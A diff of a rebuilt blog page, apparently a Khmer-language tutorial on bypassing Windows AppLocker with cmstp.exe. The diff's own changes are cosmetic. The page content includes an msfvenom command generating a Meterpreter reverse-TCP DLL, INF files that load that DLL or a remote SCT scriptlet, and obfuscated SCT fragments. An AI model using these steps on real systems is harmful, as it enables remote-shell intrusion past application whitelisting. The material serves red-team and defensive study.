@@ -1358,7 +1358,7 @@
     <meta property="twitter:description" content="Bypass applocker with cmstp to dll reverseshell.">
   
 
-<meta name="generator" content="Hugo 0.83.1" />
+<meta name="generator" content="Hugo 0.88.1" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1743,11 +1743,11 @@
       <p>ឯកសារ CMSTP ត្រូវបានរក្សាទុកនៅក្នុងថតឯកសារនៃវិនដូ៖</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-plain" data-lang="plain">C:\Windows\System32\cmstp.exe
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain">C:\Windows\System32\cmstp.exe
 C:\Windows\SysWOW64\cmstp.exe</code></pre></td></tr></table>
 </div>
 </div>
@@ -1756,17 +1756,17 @@ C:\Windows\SysWOW64\cmstp.exe</code></pre></td></tr></table>
 <p>Metasploit ត្រូវបានប្រើប្រាស់ដើម្បីបង្កើតឯកសារមេរោគ DLL តាមរយៈ MSFvenom ។</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-plain" data-lang="plain">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.55 LPORT=4444 -f dll &gt; idm.dll</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.55 LPORT=4444 -f dll &gt; idm.dll</code></pre></td></tr></table>
 </div>
 </div>
 <p><img src="/images/article/applocker-bypass-cmstp/generate-malicious-dll.png" alt="Metasploit - Malicious Dll Generation" /></p>
 <p>សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងរបស់ឯកសារ DLL ដែល​បាន​បង្កើត​រួច។</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1782,7 +1782,7 @@ C:\Windows\SysWOW64\cmstp.exe</code></pre></td></tr></table>
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-inf" data-lang="inf"><span class="k">[version]</span>
+<pre tabindex="0" class="chroma"><code class="language-inf" data-lang="inf"><span class="k">[version]</span>
 <span class="na">Signature</span><span class="o">=</span><span class="s">$chicago$</span>
 <span class="na">AdvancedINF</span><span class="o">=</span><span class="s">2.5</span>
  
@@ -1807,12 +1807,12 @@ C:\Windows\SysWOW64\cmstp.exe</code></pre></td></tr></table>
 <p><img src="/images/article/applocker-bypass-cmstp/reverse-shell.png" alt="CMSTP – Meterpreter via DLL Execution" /></p>
 <h4 id="sct">SCT</h4>
 <p>CMSTP ក៏អាចប្រើប្រាស់ឯកសារប្រភេទ SCT ដើម្បី​ទាញយក​ពាក្យ​បញ្ជា​ផ្សេងៗ​ពីម៉ាស៊ីនមេ​មក​ប្រើប្រាស់​ផង​ដែរ។</p>
-<p>លោក <a href="https://twitter.com/nickTyrer/">Nick Tyrere</a> ក៏បានបង្ហាញនៅក្នុង <a href="https://twitter.com/NickTyrer/status/958450014111633408">Twitter</a> ផងដែរ។</p>
+<p>លោក <a href="https://twitter.com/nickTyrer/">Nick Tyrere</a> បានបង្ហាញលំអិតនៅក្នុង <a href="https://twitter.com/NickTyrer/status/958450014111633408">Twitter</a> របស់គាត់។</p>
 <p>លោកក៏បានបង្កើតស្គ្រីបនេះដោយដាក់ឈ្មោះថា <a href="https://gist.github.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/">powersct.sct</a> ដែល​​ប្រើ​សម្រាប់​បើក​ដំណើរ​ការ​ពាក្យ​បញ្ជា​គ្រោះ​ថ្នាក់​ណាមួយ​ចេញ​ពី PowerShell ។</p>
 <p>សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងដំណរភ្ជាប់របស់ឯកសារ SCT ។</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1828,7 +1828,7 @@ C:\Windows\SysWOW64\cmstp.exe</code></pre></td></tr></table>
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-inf" data-lang="inf"><span class="k">[version]</span>
+<pre tabindex="0" class="chroma"><code class="language-inf" data-lang="inf"><span class="k">[version]</span>
 <span class="na">Signature</span><span class="o">=</span><span class="s">$chicago$</span>
 <span class="na">AdvancedINF</span><span class="o">=</span><span class="s">2.5</span>
  
@@ -1846,7 +1846,7 @@ C:\Windows\SysWOW64\cmstp.exe</code></pre></td></tr></table>
 </div>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1865,7 +1865,7 @@ C:\Windows\SysWOW64\cmstp.exe</code></pre></td></tr></table>
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-cfg" data-lang="cfg"><span class="c1">### powersct.sct</span>
+<pre tabindex="0" class="chroma"><code class="language-cfg" data-lang="cfg"><span class="c1">### powersct.sct</span>
 
 <span class="na">&lt;?XML version</span><span class="o">=</span><span class="s">&#34;1.0&#34;?&gt;</span>
 <span class="na">&lt;scriptlet&gt;</span>
@@ -1886,7 +1886,7 @@ C:\Windows\SysWOW64\cmstp.exe</code></pre></td></tr></table>
 </div>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1911,7 +1911,7 @@ C:\Windows\SysWOW64\cmstp.exe</code></pre></td></tr></table>
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-cfg" data-lang="cfg"><span class="c1">### SCT File Obfuscation Examples:</span>
+<pre tabindex="0" class="chroma"><code class="language-cfg" data-lang="cfg"><span class="c1">### SCT File Obfuscation Examples:</span>
 
 <span class="na">&lt;?XML version</span><span class="o">=</span><span class="s">&#34;1.0&#34;?&gt;</span>
 <span class="na">&lt;scriptlet&gt;</span>
